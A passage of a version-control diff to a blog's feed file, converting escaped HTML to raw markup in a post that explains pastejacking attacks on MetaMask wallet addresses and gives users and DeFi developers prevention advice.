-&lt;p&gt;Metamask is a popular crypto wallet commonly used for NFT transactions and blockchain applications. This wallet provides convenience to users by existing both in-browser and as a Google Chrome extension. One of the most convenient features is the fact that users can easily copy their crypto wallet address with a single click:&lt;/p&gt;
+<p>Metamask is a popular crypto wallet commonly used for NFT transactions and blockchain applications. This wallet provides convenience to users by existing both in-browser and as a Google Chrome extension. One of the most convenient features is the fact that users can easily copy their crypto wallet address with a single click:</p>
 
-&lt;p&gt;&lt;img src=&quot;../../../../../assets/image/pastejacking-crypto-wallets-forkbomb-address-theft-defi.png&quot; alt=&quot;pastejacking-crypto-wallets-forkbomb-address-theft-defi&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+<p><img src="../../../../../assets/image/pastejacking-crypto-wallets-forkbomb-address-theft-defi.png" alt="pastejacking-crypto-wallets-forkbomb-address-theft-defi" class="img-responsive" /></p>
 
-&lt;p&gt;You can probably see where this is going. An insecure website, or nefarious browser extension, running this javascript copy-injection could hijack a user’s transaction by replacing the presented contract address text with another one, such as the attacker’s address, thus redirecting funds to their wallet permanently.&lt;/p&gt;
+<p>You can probably see where this is going. An insecure website, or nefarious browser extension, running this javascript copy-injection could hijack a user’s transaction by replacing the presented contract address text with another one, such as the attacker’s address, thus redirecting funds to their wallet permanently.</p>
 
-&lt;p&gt;In the case of Metamask, tools such as &lt;a href=&quot;https://github.com/LavaMoat/LavaMoat&quot;&gt;LavaMoat&lt;/a&gt; are used to prevent software supply chain attacks from being deployed directly on its user base. However, as long as gaps within DevSecOps exist, attackers will find a way to wage attacks on users. Other means of attack, such as cross-site scripting attacks, are still viable pathways to reach individual users.&lt;/p&gt;
+<p>In the case of Metamask, tools such as <a href="https://github.com/LavaMoat/LavaMoat">LavaMoat</a> are used to prevent software supply chain attacks from being deployed directly on its user base. However, as long as gaps within DevSecOps exist, attackers will find a way to wage attacks on users. Other means of attack, such as cross-site scripting attacks, are still viable pathways to reach individual users.</p>
 
-&lt;h2 id=&quot;preventing-crypto-theft&quot;&gt;Preventing Crypto Theft&lt;/h2&gt;
-&lt;p&gt;As users of defi software, we are ultimaly responsible for our own financial safety. We advice several tips to mitigate the risk of crypto theft through pastejacking:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Always visually inspect the transaction page in MetaMask, or your preferred client before running every transaction.&lt;/li&gt;
-  &lt;li&gt;At least double/triple check the first 4 characters of the contract to see that they match up.&lt;/li&gt;
-  &lt;li&gt;Investigate suspicious contracts, especially if there is high outflow to another contract address.&lt;/li&gt;
-  &lt;li&gt;If you do a lot of business on ethereum, use services like ENS to map a trusted domain name to your contract address&lt;/li&gt;
-&lt;/ul&gt;
+<h2 id="preventing-crypto-theft">Preventing Crypto Theft</h2>
+<p>As users of defi software, we are ultimaly responsible for our own financial safety. We advice several tips to mitigate the risk of crypto theft through pastejacking:</p>
+<ul>
+  <li>Always visually inspect the transaction page in MetaMask, or your preferred client before running every transaction.</li>
+  <li>At least double/triple check the first 4 characters of the contract to see that they match up.</li>
+  <li>Investigate suspicious contracts, especially if there is high outflow to another contract address.</li>
+  <li>If you do a lot of business on ethereum, use services like ENS to map a trusted domain name to your contract address</li>
+</ul>
 
-&lt;p&gt;Unfortunately if you have fallen victim to smart contract fraud, there is little recourse in remediation other than to continue using the platform using the guidance laid out in this post and exhibiting extreme caution when handling any amount of money/value you intend to preserve.&lt;/p&gt;
+<p>Unfortunately if you have fallen victim to smart contract fraud, there is little recourse in remediation other than to continue using the platform using the guidance laid out in this post and exhibiting extreme caution when handling any amount of money/value you intend to preserve.</p>
 
-&lt;h2 id=&quot;key-learnings-for-defi-developers&quot;&gt;Key Learnings for Defi Developers&lt;/h2&gt;
+<h2 id="key-learnings-for-defi-developers">Key Learnings for Defi Developers</h2>
 
-&lt;p&gt;Just like the early stages of Web 1.0 and Web 2.0, underscoring security and trust within Web 3.0 will be the key to its widespread adoption.  The authentication and origination benefits that wallets such as MetaMask provide are compelling, however, they must be implemented with security in mind. For decentralized service providers, steps need to be taken to prevent code tampering, avoid unsafe development prctices, and protect those using the service.&lt;/p&gt;</content><author><name></name></author><category term="blog" /><summary type="html">The last several years have brought incredible gains in the number of cyberattacks waged. These attacks entail a variety of exploits, with some using methods as simple as social engineering. Human behavior is often the weakest link, and a particular javascript exploit takes advantage of trust in a computer’s copy-and-paste functionality. This form of attack, commonly referred to as pastejacking, can fit into many different cyberattack campaigns. This attack takes advantage of one of the most common user interactions with a computer.</summary></entry></feed>
+<p>Just like the early stages of Web 1.0 and Web 2.0, underscoring security and trust within Web 3.0 will be the key to its widespread adoption.  The authentication and origination benefits that wallets such as MetaMask provide are compelling, however, they must be implemented with security in mind. For decentralized service providers, steps need to be taken to prevent code tampering, avoid unsafe development prctices, and protect those using the service.</p>]]></content><author><name></name></author><category term="blog" /><summary type="html"><![CDATA[The last several years have brought incredible gains in the number of cyberattacks waged. These attacks entail a variety of exploits, with some using methods as simple as social engineering. Human behavior is often the weakest link, and a particular javascript exploit takes advantage of trust in a computer’s copy-and-paste functionality. This form of attack, commonly referred to as pastejacking, can fit into many different cyberattack campaigns. This attack takes advantage of one of the most common user interactions with a computer.]]></summary></entry></feed>
